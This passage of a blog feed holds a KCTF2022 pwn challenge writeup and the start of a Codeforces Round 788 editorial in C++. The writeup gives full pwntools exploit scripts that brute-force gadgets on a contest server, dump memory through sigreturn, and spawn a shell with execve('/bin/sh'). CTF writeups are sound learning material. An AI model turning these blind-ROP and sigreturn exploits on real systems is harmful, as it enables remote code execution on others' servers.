class="string">&#x27;warn&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x400120</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10005</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(pop_rdi)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(pop_rsi_2)+p64(<span class="number">0x400000</span>)*<span class="number">2</span>+p64(<span class="number">0x4000ce</span>)</span><br><span class="line">            <span class="comment">#payload=b&#x27;a&#x27;*0x10+</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">            ss=(p.recvall(timeout=<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),k,ss)</span><br><span class="line">            <span class="comment">#if ss==s:</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个脚本中，我们通过修改 <code>rax</code> 的值成功调用<code>sys_read</code> <code>dump</code> 出了栈上面的内存。</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/5.png" alt="5"></p><p>由此我们确定了 <code>syscall ret</code> 的 <code>gadget</code> 在 <code>0x4000ec</code> 的地方。但是还需要有一个固定能 <code>read</code> 的 <code>gadget</code> 才行，因为只有这样我们才能控制 <code>rax</code> 寄存器的值，来选择我们需要的系统调用。</p><p>当然我们也找到了，在<code>0x4000f3</code>，并且发现需要传两个参数才能把 <code>rop</code> 链拼接上去，感觉这里两个参数应该是 <code>add rsp,0x10</code> 产生的。</p><p>那也不用管那么多了，通过这两个 <code>gadget</code> 我们就能进行一次指定的系统调用，这里我们不选择使用 <code>write</code> 调用泄露栈的内存，我们直接把 <code>elf</code> 的内存给 <code>dump</code> 出来就行，因为没有 <code>gadget</code> 那我们直接用 <code>sigreturn</code> 的方式控制寄存器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000f3</span>,<span class="number">0x4000f4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10088</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            rop=SigreturnFrame()</span><br><span class="line">            rop.rax=<span class="number">1</span></span><br><span class="line">            rop.rdi=<span class="number">1</span></span><br><span class="line">            rop.rip=syscall            </span><br><span class="line">            rop.rsp=<span class="number">0x400000</span></span><br><span class="line">            rop.rbp=<span class="number">0x400000</span></span><br><span class="line">            rop.rsi=<span class="number">0x400000</span></span><br><span class="line">            rop.rdx=<span class="number">0x400</span></span><br><span class="line">            </span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">            p.interactive()        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/6.png" alt="6"></p><p>可以看到我们就成功用 <code>sigreturn</code> 调用了 <code>sys_write(1,0x400000,0x400)</code> ，至此终于不是瞎子视角了，这里再是 <code>ThTsOd</code> 师傅帮我重建了 <code>ELF</code> 文件，<code>IDA</code> 一开</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/7.png" alt="7"></p><p>其实现在 <code>IDA</code> 已经不重要了，主要还是能本地调试就非常爽。</p><p>但是这里又卡了一个关，那就是找不到确定地址可写的地方写上 <code>/bin/sh</code>。这里又双叒叕是 <code>ThTsOd</code> 师傅向我指明了 <code>0x600000</code> 处的内存是可读可写的。</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/8.png" alt="8"></p><p>打开一看果然是这样，而且给的内存还挺多，那就爽了，直接先调用 <code>sys_read</code> 再上面写上 <code>/bin/sh</code> 顺便接上 <code>rop</code> 链，然后再一次 <code>sigreturn</code> 执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code>  去获得 <code>shell</code>。</p><p>最终 <code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">s=p.recv()</span><br><span class="line">rop=SigreturnFrame()</span><br><span class="line">rop.rax=<span class="number">0</span></span><br><span class="line">rop.rdi=<span class="number">0</span></span><br><span class="line">rop.rip=syscall            </span><br><span class="line">rop.rsp=<span class="number">0x600020</span></span><br><span class="line">rop.rbp=<span class="number">0x600020</span></span><br><span class="line">rop.rsi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0x400</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(syscall)+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">rop.rax=<span class="number">59</span></span><br><span class="line">rop.rip=syscall</span><br><span class="line">rop.rdi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0</span></span><br><span class="line">rop.rsi=<span class="number">0</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题后面不难，主要是想办法 <code>dump</code> 内存重建 <code>elf</code>，然后就是签到的做法了。</p><p>题外话：那我不禁对那个精致分仅有 <code>87</code> 分的 <code>pwn</code> 题瑟瑟发抖了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;KCTF2022春季赛 第六题 writeup&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="brop" scheme="http://example.com/categories/ctf/pwn/brop/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 788(Div.2)题解</title>
    <link href="http://example.com/2022/05/07/Codeforces%20Round%20788(Div.2)/"/>
    <id>http://example.com/2022/05/07/Codeforces%20Round%20788(Div.2)/</id>
    <published>2022-05-07T10:00:00.000Z</published>
    <updated>2022-05-07T10:48:20.040Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1670">Codeforces Round #788 (Div. 2)</a>题解。</p><p>实况在<a href="https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0">这里</a></p><span id="more"></span><h2 id="A-Prof-Slim"><a href="#A-Prof-Slim" class="headerlink" title="A. Prof. Slim"></a>A. Prof. Slim</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你一个序列，一次操作会使序列中的两个数交换符号但不交换大小，问能否在若干次操作后使得序列不递减。容易得到负数的个数一定不变并且负数永远小于正数，因此最后的结果一定是负数全在前面，正数全在后面，因为一个位置的数的绝对值一定不会改变，所以可以得到在绝对值中，负数区域一定不递增，正数区域一定不递减。先 <code>O(n)</code> 统计所有的负数的个数，再判断就ok了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> num_de=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            num_de++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=num_de;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&gt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=num_de+<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])-<span class="built_in">abs</span>(a[i<span class="number">-1</span>])&lt;<span class="number">0</span>)NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dorms-War"><a href="#B-Dorms-War" class="headerlink" title="B. Dorms War"></a>B. Dorms War</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题目题意分析了很久，后面看了很久才看出来。就是说给你一个字符串和若干个特殊字符，每次操作会使得特殊字符前面的那个字符消失，直到字符不会再消失为止，问你一共消失几次，特殊字符可以被前面的特殊字符消除。</p><p>其实不难发现，一个特殊字符吞前面字符的次数就相当于它距离最近的一个特殊字符的距离+1。多个特殊字符不影响结果，取最大即可，明明是 <code>O(n)</code> 的算法，写的时间却很高，甚至因此 <code>T</code> 了一次。以后一定要记得 <code>IO</code> 优化，拒绝 <code>cin</code>，从我做起。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">memset</span>(spec,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(spec));</span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        cin&gt;&gt;tmp;</span><br><span class="line">        spec[tmp[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(spec[s[i]-<span class="string">&#x27;a&#x27;</span>])&#123;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,cnt);</span><br><span class="line">            cnt=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Where-is-the-Pizza"><a href="#C-Where-is-the-Pizza" class="headerlink" title="C. Where is the Pizza?"></a>C. Where is the Pizza?</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>选择其中一个数导致了另一个必然不选，所以这里又要选另一个必选的数，然后对于每个环只有两种方案，找到环个数相乘a和b用散列保存位置。b数组全部指向a。a数组指向 自己那个值在 b 中的位置。每次判断 这个环中的位置对应的 c是否全为0。最后特判两个相等的时候这个情况也不 乘2。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 